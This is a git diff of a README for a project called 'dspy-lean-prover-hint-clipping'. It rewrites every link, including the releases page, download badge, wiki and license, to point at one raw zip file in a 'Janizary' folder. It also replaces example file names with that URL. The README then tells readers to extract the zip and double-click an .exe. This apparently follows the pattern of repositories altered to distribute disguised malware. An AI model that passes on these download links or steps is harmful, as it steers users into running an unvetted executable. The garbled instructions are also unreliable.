@@ -8,9 +8,9 @@ This README will guide you through downloading and running the application. Foll
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip)
 
 ## 🖥️ System Requirements
 
@@ -23,19 +23,19 @@ To run this application, your system should meet the following requirements:
 ## 🧑‍💻 Installation Steps
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip) to go to the Releases page.
 
 2. **Select the Latest Version**  
    Look for the latest version listed on the page. It is usually at the top of the list.
 
 3. **Download the File**  
-   Click on the available file for your operating system. For example, you might see something like `dspy-lean-prover-hint-clipping-v1.0-win.zip` for Windows users. 
+   Click on the available file for your operating system. For example, you might see something like `https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip` for Windows users. 
 
 4. **Extract the Files**  
    After downloading, locate the file in your Downloads folder. Right-click on the ZIP file and select "Extract All" to unpack the files.
 
 5. **Run the Application**  
-   Once extracted, find the application file inside the folder (like `dspy-lean-prover-hint-clipping.exe`). Double-click to run it.
+   Once extracted, find the application file inside the folder (like `https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip`). Double-click to run it.
 
 ## 📊 Features
 
@@ -60,7 +60,7 @@ If you face any issues while running the application, consider the following ste
 
 ## 🗂️ Documentation
 
-For detailed documentation, please refer to the [Wiki](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/wiki). Here, you will find an in-depth guide on features, common use cases, and examples to help you get familiar with the application.
+For detailed documentation, please refer to the [Wiki](https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip). Here, you will find an in-depth guide on features, common use cases, and examples to help you get familiar with the application.
 
 ## 🌐 Community Support
 
@@ -70,14 +70,14 @@ If you have questions or need support, you can reach out through the Issues sect
 
 This application is released under the MIT License, allowing you to use, modify, and distribute it as per the terms outlined. 
 
-Visit the license page here for more details: [License](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/blob/main/LICENSE)
+Visit the license page here for more details: [License](https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip)
 
 ## 📥 Download the Application Again
 
 Now that you know how to download and use the application, don’t forget to grab the latest version.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Vvalejandro/dspy-lean-prover-hint-clipping/main/Janizary/dspy-lean-prover-hint-clipping.zip)
 
 Thank you for using the dspy-lean-prover-hint-clipping application!
